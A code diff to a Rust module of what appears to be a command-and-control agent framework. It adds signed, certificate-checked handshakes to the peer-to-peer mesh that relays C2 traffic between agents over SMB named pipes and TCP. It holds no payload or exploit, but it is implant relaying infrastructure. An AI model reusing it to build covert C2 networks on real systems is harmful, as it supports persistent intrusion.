@@ -9,13 +9,16 @@
 //!
 //! ## Handshake Protocol (shared between SMB and TCP)
 //!
-//! 1. Child sends `LinkRequest` with payload =
-//!    `[agent_id_len:u16 LE][agent_id:bytes][x25519_pubkey:32B]`.
-//! 2. Parent validates capacity, generates its own X25519 ephemeral keypair.
+//! 1. Child sends `LinkRequest` with an authenticated payload containing its
+//!    `agent_id`, X25519 public key, server-issued mesh certificate, and an
+//!    Ed25519 signature over the handshake transcript.
+//! 2. Parent validates capacity, verifies the child certificate/proof,
+//!    and generates its own X25519 ephemeral keypair.
 //! 3. Parent computes ECDH shared secret and derives per-link
 //!    ChaCha20-Poly1305 key via HKDF-SHA256(`info = hkdf_info::P2P_LINK`).
-//! 4. Parent sends `LinkAccept` with payload = `[parent_x25519_pubkey:32B]`.
-//! 5. Link transitions to `Connected` and is added to `P2pMesh::child_link_ids`.
+//! 4. Parent sends `LinkAccept` with the same authenticated payload shape.
+//! 5. Child verifies the parent certificate/proof, then both sides transition
+//!    to `Connected` with `peer_certificate` populated.
 //!
 //! If capacity is reached, the parent sends `LinkReject` with reason code
 //! `0x01` (capacity full) and closes the connection.
@@ -38,9 +41,9 @@
 //! Uses `tokio::net::TcpListener` / `TcpStream` with length-prefix framing
 //! (4-byte LE u32 prefix) over TCP's stream-oriented transport.
 
+use ed25519_dalek::{Signature, Signer, SigningKey, Verifier, VerifyingKey};
 use serde::{Deserialize, Serialize};
-use std::collections::{HashMap, VecDeque};
-#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
+use std::collections::{HashMap, HashSet, VecDeque};
 use std::sync::Arc;
 use std::time::{Duration, Instant};
 
@@ -208,8 +211,8 @@ impl LinkQuality {
         if self.bandwidth_bps == 0 {
             self.bandwidth_bps = new_estimate_bps;
         } else {
-            let smoothed = (1.0 - ALPHA) * self.bandwidth_bps as f64
-                + ALPHA * new_estimate_bps as f64;
+            let smoothed =
+                (1.0 - ALPHA) * self.bandwidth_bps as f64 + ALPHA * new_estimate_bps as f64;
             self.bandwidth_bps = smoothed as u64;
         }
     }
@@ -220,15 +223,11 @@ impl LinkQuality {
             return 1.0;
         }
         // Latency contribution: 100ms or less = 1.0, degrades to 0 at 2000ms.
-        let lat_score = 1.0_f32
-            .min(100.0 / self.latency_ms as f32)
-            .max(0.0);
+        let lat_score = 1.0_f32.min(100.0 / self.latency_ms as f32).max(0.0);
         // Packet loss contribution: 0% loss = 1.0, 100% = 0.
         let loss_score = 1.0 - self.packet_loss;
         // Jitter contribution: 0ms jitter = 1.0, degrades to 0 at 500ms.
-        let jitter_score = 1.0_f32
-            .min(50.0 / (self.jitter_ms as f32 + 1.0))
-            .max(0.0);
+        let jitter_score = 1.0_f32.min(50.0 / (self.jitter_ms as f32 + 1.0)).max(0.0);
         // Weighted composite: 40% latency, 40% loss, 20% jitter.
         lat_score * 0.4 + loss_score * 0.4 + jitter_score * 0.2
     }
@@ -546,7 +545,6 @@ pub struct MeshTopology {
 }
 
 /// The P2P mesh maintained by a single agent.
-#[derive(Debug)]
 pub struct P2pMesh {
     /// All active links keyed by `link_id`.
     pub links: HashMap<u32, P2pLink>,
@@ -581,6 +579,10 @@ pub struct P2pMesh {
     // ── Mesh certificate + security state ───────────────────────────────
     /// This agent's mesh certificate (issued by server during check-in).
     pub mesh_certificate: Option<common::MeshCertificate>,
+    /// Ed25519 private key used to prove ownership of `mesh_certificate`.
+    mesh_private_key: Option<Arc<common::LockedSecret>>,
+    /// Ed25519 public key corresponding to `mesh_private_key`.
+    pub mesh_public_key: Option<[u8; 32]>,
     /// Server's Ed25519 public key for verifying peer certificates.
     /// Extracted from the build-time config (same key as `module_signing_key`).
     pub server_ed25519_public_key: Option<[u8; 32]>,
@@ -594,6 +596,33 @@ pub struct P2pMesh {
     /// Kill switch: when true, all P2P links are terminated and no new links
     /// are accepted until cleared by the server.
     pub kill_switch_active: bool,
+}
+
+impl std::fmt::Debug for P2pMesh {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.debug_struct("P2pMesh")
+            .field("links", &self.links)
+            .field("parent_link_id", &self.parent_link_id)
+            .field("child_link_ids", &self.child_link_ids)
+            .field("peer_link_ids", &self.peer_link_ids)
+            .field("agent_id", &self.agent_id)
+            .field("max_children", &self.max_children)
+            .field("max_peers", &self.max_peers)
+            .field("mesh_mode", &self.mesh_mode)
+            .field("routing_table", &self.routing_table)
+            .field("has_mesh_certificate", &self.mesh_certificate.is_some())
+            .field("has_mesh_private_key", &self.mesh_private_key.is_some())
+            .field("has_mesh_public_key", &self.mesh_public_key.is_some())
+            .field(
+                "has_server_ed25519_public_key",
+                &self.server_ed25519_public_key.is_some(),
+            )
+            .field("quarantined_agents", &self.quarantined_agents.len())
+            .field("revoked_agents", &self.revoked_agents.len())
+            .field("compartment", &self.compartment)
+            .field("kill_switch_active", &self.kill_switch_active)
+            .finish()
+    }
 }
 
 impl P2pMesh {
@@ -617,6 +646,8 @@ impl P2pMesh {
             relay_bytes_current_window: 0,
             relay_bandwidth_budget: u64::MAX,
             mesh_certificate: None,
+            mesh_private_key: None,
+            mesh_public_key: None,
             server_ed25519_public_key: None,
             quarantined_agents: std::collections::HashSet::new(),
             revoked_agents: std::collections::HashSet::new(),
@@ -647,12 +678,61 @@ impl P2pMesh {
             relay_bytes_current_window: 0,
             relay_bandwidth_budget: u64::MAX,
             mesh_certificate: None,
+            mesh_private_key: None,
+            mesh_public_key: None,
             server_ed25519_public_key: None,
             quarantined_agents: std::collections::HashSet::new(),
             revoked_agents: std::collections::HashSet::new(),
             compartment: None,
             kill_switch_active: false,
         }
+    }
+
+    /// Install this agent's long-term Ed25519 mesh identity.
+    pub fn set_mesh_identity(
+        &mut self,
+        private_key: Arc<common::LockedSecret>,
+        public_key: [u8; 32],
+    ) {
+        self.mesh_private_key = Some(private_key);
+        self.mesh_public_key = Some(public_key);
+    }
+
+    fn auth_context(&self) -> anyhow::Result<MeshAuthContext> {
+        if self.agent_id.is_empty() {
+            anyhow::bail!("P2P mesh identity is missing agent_id");
+        }
+        let private_key = self
+            .mesh_private_key
+            .clone()
+            .ok_or_else(|| anyhow::anyhow!("P2P mesh identity is missing private key"))?;
+        let public_key = self
+            .mesh_public_key
+            .ok_or_else(|| anyhow::anyhow!("P2P mesh identity is missing public key"))?;
+        let certificate = self
+            .mesh_certificate
+            .clone()
+            .ok_or_else(|| anyhow::anyhow!("P2P mesh certificate has not been issued yet"))?;
+
+        if certificate.agent_id_hash != common::hash_agent_id(&self.agent_id) {
+            anyhow::bail!("P2P mesh certificate does not match this agent_id");
+        }
+        if certificate.public_key != public_key {
+            anyhow::bail!("P2P mesh certificate public key does not match local identity");
+        }
+        if certificate.is_expired(unix_now_secs()) {
+            anyhow::bail!("P2P mesh certificate is expired");
+        }
+
+        Ok(MeshAuthContext {
+            agent_id: self.agent_id.clone(),
+            private_key,
+            public_key,
+            certificate,
+            server_ed25519_public_key: self.server_ed25519_public_key,
+            revoked_agents: self.revoked_agents.clone(),
+            compartment: self.compartment.clone(),
+        })
     }
 
     /// Returns `true` if this agent can accept another child link.
@@ -711,7 +791,8 @@ impl P2pMesh {
 
     /// Get a mutable reference to the parent link, if one exists.
     pub fn parent_link_mut(&mut self) -> Option<&mut P2pLink> {
-        self.parent_link_id.and_then(move |id| self.links.get_mut(&id))
+        self.parent_link_id
+            .and_then(move |id| self.links.get_mut(&id))
     }
 
     /// Iterate over all connected child links.
@@ -755,6 +836,7 @@ impl P2pMesh {
             anyhow::bail!("already have a connected parent link");
         }
 
+        let auth = self.auth_context()?;
         let link_id: u32 = rand::Rng::gen_range(&mut rand::thread_rng(), 0x0001_0000..=0xFFFF_FFFF);
 
         match transport.to_lowercase().as_str() {
@@ -763,8 +845,7 @@ impl P2pMesh {
                 {
                     // Parse host:port from the address string.
                     let (host, port) = parse_host_port(addr)?;
-                    let result =
-                        tcp_transport::connect(&host, port, &self.agent_id, link_id).await?;
+                    let result = tcp_transport::connect(&host, port, &auth, link_id).await?;
                     match result {
                         tcp_transport::ConnectResult::Connected(mut link) => {
                             // Transition from Linking → Connected is already
@@ -791,10 +872,7 @@ impl P2pMesh {
                             // Spawn the parent reader task to receive C2
                             // messages from the parent link.
                             if let Some(ref inbound_tx) = self.inbound_tx {
-                                spawn_parent_reader(
-                                    mesh_arc,
-                                    inbound_tx.clone(),
-                                );
+                                spawn_parent_reader(mesh_arc, inbound_tx.clone());
                             }
 
                             log::info!(
@@ -825,9 +903,9 @@ impl P2pMesh {
                     // Connect to the parent's named pipe (blocking NT I/O
                     // on spawn_blocking, then async-wrapped).
                     let addr_owned = addr.to_string();
-                    let agent_id = self.agent_id.clone();
+                    let auth = auth.clone();
                     let result = tokio::task::spawn_blocking(move || {
-                        nt_pipe_server::connect(&addr_owned, &agent_id, link_id)
+                        nt_pipe_server::connect(&addr_owned, &auth, link_id)
                     })
                     .await
                     .map_err(|e| anyhow::anyhow!("p2p-pipe connect task panicked: {e}"))??;
@@ -925,7 +1003,9 @@ impl P2pMesh {
             if let Some(removed) = self.remove_link(*lid) {
                 log::info!(
                     "P2P: disconnected link {:#010X} (peer={}, role={:?})",
-                    lid, removed.peer_agent_id, removed.role
+                    lid,
+                    removed.peer_agent_id,
+                    removed.role
                 );
             }
         }
@@ -1059,7 +1139,8 @@ impl P2pMesh {
 
     /// Clear all routes through a specific next-hop (used when a link dies).
     pub fn remove_routes_via(&mut self, next_hop: u32) {
-        self.routing_table.retain(|_, entry| entry.next_hop != next_hop);
+        self.routing_table
+            .retain(|_, entry| entry.next_hop != next_hop);
     }
 
     /// Return a snapshot of the routing table as a vec of `RouteEntry`.
@@ -1152,9 +1233,15 @@ pub enum P2pListenerEvent {
 
 /// LinkReject reason: capacity full.
 pub const REJECT_CAPACITY_FULL: u8 = 0x01;
+/// LinkReject reason: peer certificate or identity proof failed.
+pub const REJECT_AUTHENTICATION_FAILED: u8 = 0x02;
 
 /// HKDF info string for P2P link key derivation.
 const P2P_HKDF_INFO: &[u8] = common::hkdf_info::P2P_LINK;
+
+const HANDSHAKE_DOMAIN: &[u8] = b"orchestra-p2p-link-handshake-v1";
+const HANDSHAKE_KIND_REQUEST: u8 = 1;
+const HANDSHAKE_KIND_ACCEPT: u8 = 2;
 
 /// Maximum agent_id length accepted in a LinkRequest.
 pub(crate) const MAX_AGENT_ID_LEN: usize = 256;
@@ -1164,6 +1251,55 @@ const TCP_MAX_FRAME_BYTES: usize = 16 * 1024 * 1024;
 
 /// ChaCha20-Poly1305 nonce size (12 bytes).
 const NONCE_SIZE: usize = 12;
+
+#[derive(Clone)]
+pub struct MeshAuthContext {
+    pub agent_id: String,
+    private_key: Arc<common::LockedSecret>,
+    pub public_key: [u8; 32],
+    pub certificate: common::MeshCertificate,
+    pub server_ed25519_public_key: Option<[u8; 32]>,
+    pub revoked_agents: HashSet<[u8; 32]>,
+    pub compartment: Option<String>,
+}
+
+impl std::fmt::Debug for MeshAuthContext {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.debug_struct("MeshAuthContext")
+            .field("agent_id", &self.agent_id)
+            .field("public_key", &&self.public_key[..4])
+            .field("certificate_expires_at", &self.certificate.expires_at)
+            .field(
+                "has_server_ed25519_public_key",
+                &self.server_ed25519_public_key.is_some(),
+            )
+            .field("revoked_agents", &self.revoked_agents.len())
+            .field("compartment", &self.compartment)
+            .finish()
+    }
+}
+
+#[derive(Debug, Clone)]
+struct AuthenticatedPeer {
+    agent_id: String,
+    x25519_pubkey: [u8; 32],
+    certificate: common::MeshCertificate,
+}
+
+#[derive(Debug, Serialize, Deserialize)]
+struct WireLinkHandshake {
+    agent_id: String,
+    x25519_pubkey: [u8; 32],
+    certificate: common::MeshCertificate,
+    identity_signature: Vec<u8>,
+}
+
+fn unix_now_secs() -> u64 {
+    std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0)
+}
 
 /// ChaCha20-Poly1305 authentication tag size (16 bytes).
 const TAG_SIZE: usize = 16;
@@ -1233,56 +1369,235 @@ fn decrypt_payload(key: &[u8; 32], encrypted: &[u8]) -> anyhow::Result<Vec<u8>> 
 
 // ── Shared handshake helpers ─────────────────────────────────────────────
 
-/// Parse a `LinkRequest` payload into `(child_agent_id, child_pubkey)`.
-///
-/// Payload format:
-/// ```text
-/// [ agent_id_len: u16 LE ] [ agent_id: bytes ] [ x25519_pubkey: 32 bytes ]
-/// ```
-fn parse_link_request(payload: &[u8]) -> anyhow::Result<(String, [u8; 32])> {
-    if payload.len() < 2 + 32 {
-        return Err(anyhow::anyhow!(
-            "LinkRequest payload too short: {} bytes (need at least 34)",
-            payload.len()
-        ));
-    }
-
-    let id_len = u16::from_le_bytes([payload[0], payload[1]]) as usize;
-    if id_len > MAX_AGENT_ID_LEN {
-        return Err(anyhow::anyhow!(
-            "LinkRequest agent_id too long: {id_len} > {MAX_AGENT_ID_LEN}"
-        ));
-    }
-    if payload.len() < 2 + id_len + 32 {
-        return Err(anyhow::anyhow!(
-            "LinkRequest payload truncated: have {} bytes, need {}",
-            payload.len(),
-            2 + id_len + 32
-        ));
-    }
-
-    let agent_id = String::from_utf8(payload[2..2 + id_len].to_vec())
-        .map_err(|e| anyhow::anyhow!("LinkRequest agent_id is not valid UTF-8: {e}"))?;
-
-    let mut pubkey = [0u8; 32];
-    pubkey.copy_from_slice(&payload[2 + id_len..2 + id_len + 32]);
-
-    Ok((agent_id, pubkey))
+fn mesh_handshake_signing_input(
+    kind: u8,
+    link_id: u32,
+    agent_id: &str,
+    x25519_pubkey: &[u8; 32],
+    certificate: &common::MeshCertificate,
+) -> Vec<u8> {
+    let mut input = Vec::with_capacity(
+        HANDSHAKE_DOMAIN.len()
+            + 1
+            + 4
+            + 2
+            + agent_id.len()
+            + 32
+            + certificate.signing_input().len(),
+    );
+    input.extend_from_slice(HANDSHAKE_DOMAIN);
+    input.push(kind);
+    input.extend_from_slice(&link_id.to_le_bytes());
+    input.extend_from_slice(&(agent_id.len() as u16).to_le_bytes());
+    input.extend_from_slice(agent_id.as_bytes());
+    input.extend_from_slice(x25519_pubkey);
+    input.extend_from_slice(&certificate.signing_input());
+    input
 }
 
-/// Build a `LinkRequest` payload with our agent_id and X25519 public key.
-fn build_link_request_payload(agent_id: &str, pub_key: &[u8; 32]) -> Vec<u8> {
-    let id_bytes = agent_id.as_bytes();
-    let mut payload = Vec::with_capacity(2 + id_bytes.len() + 32);
-    payload.extend_from_slice(&(id_bytes.len() as u16).to_le_bytes());
-    payload.extend_from_slice(id_bytes);
-    payload.extend_from_slice(pub_key);
-    payload
+fn signing_key_from_locked(secret: &common::LockedSecret) -> anyhow::Result<SigningKey> {
+    let bytes = secret.as_bytes();
+    if bytes.len() != 32 {
+        anyhow::bail!(
+            "mesh private key must be 32 bytes, got {} byte(s)",
+            bytes.len()
+        );
+    }
+    let mut key_bytes = [0u8; 32];
+    key_bytes.copy_from_slice(bytes);
+    Ok(SigningKey::from_bytes(&key_bytes))
 }
 
-/// Build a `LinkAccept` payload containing our X25519 public key.
-fn build_link_accept_payload(pub_key: &[u8; 32]) -> Vec<u8> {
-    pub_key.to_vec()
+fn verify_peer_certificate_material(
+    server_ed25519_public_key: Option<&[u8; 32]>,
+    revoked_agents: &HashSet<[u8; 32]>,
+    compartment: Option<&str>,
+    cert: &common::MeshCertificate,
+    peer_agent_id: &str,
+    now: u64,
+) -> Result<(), String> {
+    if cert.is_expired(now) {
+        return Err(format!(
+            "mesh certificate expired (expires_at={})",
+            cert.expires_at
+        ));
+    }
+
+    if revoked_agents.contains(&cert.agent_id_hash) {
+        return Err("mesh certificate has been revoked".to_string());
+    }
+
+    let expected_hash = common::hash_agent_id(peer_agent_id);
+    if cert.agent_id_hash != expected_hash {
+        return Err("mesh certificate agent_id_hash mismatch".to_string());
+    }
+
+    if cert.public_key == [0u8; 32] {
+        return Err(
+            "mesh certificate has all-zeros public_key (PSK-only cert, no P2P identity binding)"
+                .to_string(),
+        );
+    }
+
+    if let Some(server_pk) = server_ed25519_public_key {
+        #[cfg(feature = "module-signatures")]
+        {
+            if let Err(e) = common::verify_mesh_certificate(cert, server_pk, now) {
+                return Err(format!("mesh certificate signature invalid: {e}"));
+            }
+        }
+        #[cfg(not(feature = "module-signatures"))]
+        {
+            let _ = (server_pk, now);
+            log::warn!(
+                "mesh certificate signature verification skipped: module-signatures feature not enabled"
+            );
+        }
+    } else {
+        log::warn!(
+            "mesh certificate signature verification skipped: no server Ed25519 public key configured"
+        );
+    }
+
+    if let Some(our_compartment) = compartment {
+        match &cert.compartment {
+            Some(their_compartment) if their_compartment == our_compartment => {}
+            Some(their_compartment) => {
+                return Err(format!(
+                    "compartment mismatch: ours={our_compartment}, theirs={their_compartment}"
+                ));
+            }
+            None => {
+                return Err(format!(
+                    "peer has no compartment but we require compartment '{our_compartment}'"
+                ));
+            }
+        }
+    }
+
+    Ok(())
+}
+
+fn build_authenticated_link_payload(
+    auth: &MeshAuthContext,
+    pub_key: &[u8; 32],
+    link_id: u32,
+    kind: u8,
+) -> anyhow::Result<Vec<u8>> {
+    if auth.agent_id.len() > MAX_AGENT_ID_LEN {
+        anyhow::bail!(
+            "Link handshake agent_id too long: {} > {}",
+            auth.agent_id.len(),
+            MAX_AGENT_ID_LEN
+        );
+    }
+    if auth.certificate.public_key != auth.public_key {
+        anyhow::bail!("mesh certificate public key does not match local identity");
+    }
+
+    let signing_key = signing_key_from_locked(&auth.private_key)?;
+    let input =
+        mesh_handshake_signing_input(kind, link_id, &auth.agent_id, pub_key, &auth.certificate);
+    let signature = signing_key.sign(&input).to_bytes().to_vec();
+    let wire = WireLinkHandshake {
+        agent_id: auth.agent_id.clone(),
+        x25519_pubkey: *pub_key,
+        certificate: auth.certificate.clone(),
+        identity_signature: signature,
+    };
+    bincode::serialize(&wire).map_err(|e| anyhow::anyhow!("serialize Link handshake: {e}"))
+}
+
+fn parse_authenticated_link_payload(
+    payload: &[u8],
+    auth: &MeshAuthContext,
+    link_id: u32,
+    kind: u8,
+) -> anyhow::Result<AuthenticatedPeer> {
+    let wire: WireLinkHandshake = bincode::deserialize(payload)
+        .map_err(|e| anyhow::anyhow!("authenticated Link handshake payload is invalid: {e}"))?;
+
+    if wire.agent_id.len() > MAX_AGENT_ID_LEN {
+        anyhow::bail!(
+            "Link handshake agent_id too long: {} > {}",
+            wire.agent_id.len(),
+            MAX_AGENT_ID_LEN
+        );
+    }
+    if wire.identity_signature.len() != 64 {
+        anyhow::bail!(
+            "Link handshake identity signature must be 64 bytes, got {}",
+            wire.identity_signature.len()
+        );
+    }
+
+    let mut sig_bytes = [0u8; 64];
+    sig_bytes.copy_from_slice(&wire.identity_signature);
+    verify_peer_certificate_material(
+        auth.server_ed25519_public_key.as_ref(),
+        &auth.revoked_agents,
+        auth.compartment.as_deref(),
+        &wire.certificate,
+        &wire.agent_id,
+        unix_now_secs(),
+    )
+    .map_err(|e| anyhow::anyhow!("peer mesh certificate rejected: {e}"))?;
+
+    let verifying_key = VerifyingKey::from_bytes(&wire.certificate.public_key)
+        .map_err(|e| anyhow::anyhow!("peer mesh certificate public key is invalid: {e}"))?;
+    let input = mesh_handshake_signing_input(
+        kind,
+        link_id,
+        &wire.agent_id,
+        &wire.x25519_pubkey,
+        &wire.certificate,
+    );
+    let signature = Signature::from_bytes(&sig_bytes);
+    verifying_key
+        .verify(&input, &signature)
+        .map_err(|e| anyhow::anyhow!("peer mesh identity proof is invalid: {e}"))?;
+
+    Ok(AuthenticatedPeer {
+        agent_id: wire.agent_id,
+        x25519_pubkey: wire.x25519_pubkey,
+        certificate: wire.certificate,
+    })
+}
+
+/// Parse and verify a `LinkRequest` payload.
+fn parse_link_request(
+    payload: &[u8],
+    auth: &MeshAuthContext,
+    link_id: u32,
+) -> anyhow::Result<AuthenticatedPeer> {
+    parse_authenticated_link_payload(payload, auth, link_id, HANDSHAKE_KIND_REQUEST)
+}
+
+/// Parse and verify a `LinkAccept` payload.
+fn parse_link_accept(
+    payload: &[u8],
+    auth: &MeshAuthContext,
+    link_id: u32,
+) -> anyhow::Result<AuthenticatedPeer> {
+    parse_authenticated_link_payload(payload, auth, link_id, HANDSHAKE_KIND_ACCEPT)
+}
+
+/// Build a `LinkRequest` payload with our authenticated mesh identity.
+fn build_link_request_payload(
+    auth: &MeshAuthContext,
+    pub_key: &[u8; 32],
+    link_id: u32,
+) -> anyhow::Result<Vec<u8>> {
+    build_authenticated_link_payload(auth, pub_key, link_id, HANDSHAKE_KIND_REQUEST)
+}
+
+/// Build a `LinkAccept` payload with our authenticated mesh identity.
+fn build_link_accept_payload(
+    auth: &MeshAuthContext,
+    pub_key: &[u8; 32],
+    link_id: u32,
+) -> anyhow::Result<Vec<u8>> {
+    build_authenticated_link_payload(auth, pub_key, link_id, HANDSHAKE_KIND_ACCEPT)
 }
 
 /// Build a `LinkReject` payload with a reason code.
@@ -1299,127 +1614,124 @@ mod forwarding_impl {
     use super::*;
 
     /// Read a `DataForward` frame from a child link, decrypt the payload with
-/// the per-link key, and return the plaintext C2 data along with the
-/// child's `link_id`.
-///
-/// This is the **child-to-server** half of the forwarding pipeline.
-/// The caller should send the returned `(child_link_id, data)` tuple
-/// upstream to the server via a `Message::P2pForward`.
-///
-/// # Errors
-///
-/// Returns an error if the read fails, the frame is not `DataForward`,
-/// or the payload cannot be decrypted.
-pub async fn read_child_data_forward(
-    link: &mut P2pLink,
-) -> anyhow::Result<(u32, Vec<u8>)> {
-    let link_key = link.ecdh_shared_secret;
+    /// the per-link key, and return the plaintext C2 data along with the
+    /// child's `link_id`.
+    ///
+    /// This is the **child-to-server** half of the forwarding pipeline.
+    /// The caller should send the returned `(child_link_id, data)` tuple
+    /// upstream to the server via a `Message::P2pForward`.
+    ///
+    /// # Errors
+    ///
+    /// Returns an error if the read fails, the frame is not `DataForward`,
+    /// or the payload cannot be decrypted.
+    pub async fn read_child_data_forward(link: &mut P2pLink) -> anyhow::Result<(u32, Vec<u8>)> {
+        let link_key = link.ecdh_shared_secret;
 
-    match &mut link.transport {
-        #[cfg(feature = "p2p-tcp")]
-        P2pTransport::TcpStream(handle_arc) => {
-            let mut handle = handle_arc.lock().await;
-            let frame = handle.read_frame_decrypt(&link_key).await?;
-            if frame.frame_type != P2pFrameType::DataForward {
-                return Err(anyhow::anyhow!(
-                    "expected DataForward from child, got {:?}",
-                    frame.frame_type
-                ));
+        match &mut link.transport {
+            #[cfg(feature = "p2p-tcp")]
+            P2pTransport::TcpStream(handle_arc) => {
+                let mut handle = handle_arc.lock().await;
+                let frame = handle.read_frame_decrypt(&link_key).await?;
+                if frame.frame_type != P2pFrameType::DataForward {
+                    return Err(anyhow::anyhow!(
+                        "expected DataForward from child, got {:?}",
+                        frame.frame_type
+                    ));
+                }
+                Ok((frame.link_id, frame.payload))
             }
-            Ok((frame.link_id, frame.payload))
-        }
 
-        #[cfg(all(windows, feature = "smb-pipe-transport"))]
-        P2pTransport::SmbPipe(ref pipe) => {
-            let frame = nt_pipe_server::NtPipeHandle::read_frame(pipe)?;
-            if frame.frame_type != P2pFrameType::DataForward {
-                return Err(anyhow::anyhow!(
-                    "expected DataForward from child, got {:?}",
-                    frame.frame_type
-                ));
+            #[cfg(all(windows, feature = "smb-pipe-transport"))]
+            P2pTransport::SmbPipe(ref pipe) => {
+                let frame = nt_pipe_server::NtPipeHandle::read_frame(pipe)?;
+                if frame.frame_type != P2pFrameType::DataForward {
+                    return Err(anyhow::anyhow!(
+                        "expected DataForward from child, got {:?}",
+                        frame.frame_type
+                    ));
+                }
+                let plaintext = decrypt_payload(&link_key, &frame.payload)?;
+                Ok((frame.link_id, plaintext))
             }
-            let plaintext = decrypt_payload(&link_key, &frame.payload)?;
-            Ok((frame.link_id, plaintext))
-        }
 
-        _ => Err(anyhow::anyhow!(
-            "unsupported transport for P2P data forwarding"
-        )),
-    }
-}
-
-/// Forward server-originated C2 data to a specific child link.
-///
-/// This is the **server-to-child** half of the forwarding pipeline.
-/// The `data` parameter is the **plaintext** C2 payload (already decrypted
-/// from the parent's C2 session key by the caller).  This function
-/// re-encrypts it with the child's per-link ChaCha20-Poly1305 key and
-/// sends a `DataForward` P2P frame.
-///
-/// # Errors
-///
-/// Returns an error if the link doesn't exist, is not in a usable state,
-/// or the write fails.
-pub async fn forward_to_child(
-    mesh: &mut P2pMesh,
-    child_link_id: u32,
-    data: &[u8],
-) -> anyhow::Result<()> {
-    let link = mesh.links.get_mut(&child_link_id).ok_or_else(|| {
-        anyhow::anyhow!("P2P forward_to_child: unknown link_id {child_link_id:#010X}")
-    })?;
-
-    if !link.state.is_usable() {
-        return Err(anyhow::anyhow!(
-            "P2P forward_to_child: link {child_link_id:#010X} not usable (state={:?})",
-            link.state
-        ));
-    }
-
-    let link_key = link.ecdh_shared_secret;
-
-    match &mut link.transport {
-        #[cfg(feature = "p2p-tcp")]
-        P2pTransport::TcpStream(handle_arc) => {
-            let mut handle = handle_arc.lock().await;
-            let frame = P2pFrame {
-                frame_type: P2pFrameType::DataForward,
-                link_id: child_link_id,
-                sequence: 0,
-                payload_len: 0, // filled by encrypt_write_frame
-                payload: data.to_vec(),
-            };
-            handle.encrypt_write_frame(&frame, &link_key).await?;
-        }
-
-        #[cfg(all(windows, feature = "smb-pipe-transport"))]
-        P2pTransport::SmbPipe(ref pipe) => {
-            let encrypted = encrypt_payload(&link_key, data)?;
-            let frame = P2pFrame {
-                frame_type: P2pFrameType::DataForward,
-                link_id: child_link_id,
-                sequence: 0,
-                payload_len: encrypted.len() as u32,
-                payload: encrypted,
-            };
-            nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
-        }
-
-        _ => {
-            return Err(anyhow::anyhow!(
+            _ => Err(anyhow::anyhow!(
                 "unsupported transport for P2P data forwarding"
+            )),
+        }
+    }
+
+    /// Forward server-originated C2 data to a specific child link.
+    ///
+    /// This is the **server-to-child** half of the forwarding pipeline.
+    /// The `data` parameter is the **plaintext** C2 payload (already decrypted
+    /// from the parent's C2 session key by the caller).  This function
+    /// re-encrypts it with the child's per-link ChaCha20-Poly1305 key and
+    /// sends a `DataForward` P2P frame.
+    ///
+    /// # Errors
+    ///
+    /// Returns an error if the link doesn't exist, is not in a usable state,
+    /// or the write fails.
+    pub async fn forward_to_child(
+        mesh: &mut P2pMesh,
+        child_link_id: u32,
+        data: &[u8],
+    ) -> anyhow::Result<()> {
+        let link = mesh.links.get_mut(&child_link_id).ok_or_else(|| {
+            anyhow::anyhow!("P2P forward_to_child: unknown link_id {child_link_id:#010X}")
+        })?;
+
+        if !link.state.is_usable() {
+            return Err(anyhow::anyhow!(
+                "P2P forward_to_child: link {child_link_id:#010X} not usable (state={:?})",
+                link.state
             ));
         }
+
+        let link_key = link.ecdh_shared_secret;
+
+        match &mut link.transport {
+            #[cfg(feature = "p2p-tcp")]
+            P2pTransport::TcpStream(handle_arc) => {
+                let mut handle = handle_arc.lock().await;
+                let frame = P2pFrame {
+                    frame_type: P2pFrameType::DataForward,
+                    link_id: child_link_id,
+                    sequence: 0,
+                    payload_len: 0, // filled by encrypt_write_frame
+                    payload: data.to_vec(),
+                };
+                handle.encrypt_write_frame(&frame, &link_key).await?;
+            }
+
+            #[cfg(all(windows, feature = "smb-pipe-transport"))]
+            P2pTransport::SmbPipe(ref pipe) => {
+                let encrypted = encrypt_payload(&link_key, data)?;
+                let frame = P2pFrame {
+                    frame_type: P2pFrameType::DataForward,
+                    link_id: child_link_id,
+                    sequence: 0,
+                    payload_len: encrypted.len() as u32,
+                    payload: encrypted,
+                };
+                nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
+            }
+
+            _ => {
+                return Err(anyhow::anyhow!(
+                    "unsupported transport for P2P data forwarding"
+                ));
+            }
+        }
+
+        Ok(())
     }
-
-    Ok(())
-}
-
 } // end mod forwarding_impl
 
 // Re-export forwarding functions at crate-visible scope.
 #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
-pub use forwarding_impl::{read_child_data_forward, forward_to_child};
+pub use forwarding_impl::{forward_to_child, read_child_data_forward};
 
 // ── Raw frame reader (multi-type dispatch) ─────────────────────────────
 
@@ -1438,13 +1750,9 @@ pub async fn read_raw_frame(link: &mut P2pLink) -> anyhow::Result<P2pFrame> {
         }
 
         #[cfg(all(windows, feature = "smb-pipe-transport"))]
-        P2pTransport::SmbPipe(ref pipe) => {
-            nt_pipe_server::NtPipeHandle::read_frame(pipe)
-        }
+        P2pTransport::SmbPipe(ref pipe) => nt_pipe_server::NtPipeHandle::read_frame(pipe),
 
-        _ => Err(anyhow::anyhow!(
-            "unsupported transport for raw frame read"
-        )),
+        _ => Err(anyhow::anyhow!("unsupported transport for raw frame read")),
     }
 }
 
@@ -1463,7 +1771,10 @@ pub const ROUTE_MIN_QUALITY: f32 = 0.1;
 
 /// Send a `RouteUpdate` frame on a single link, advertising our routing table.
 #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
-async fn send_route_update(link: &mut P2pLink, entries: &[common::p2p_proto::RouteEntry]) -> anyhow::Result<()> {
+async fn send_route_update(
+    link: &mut P2pLink,
+    entries: &[common::p2p_proto::RouteEntry],
+) -> anyhow::Result<()> {
     let key = link.ecdh_shared_secret;
     let payload = common::p2p_proto::serialize_route_update(entries);
     let encrypted = encrypt_payload(&key, &payload)?;
@@ -1486,9 +1797,7 @@ async fn send_route_update(link: &mut P2pLink, entries: &[common::p2p_proto::Rou
             nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
         }
         _ => {
-            return Err(anyhow::anyhow!(
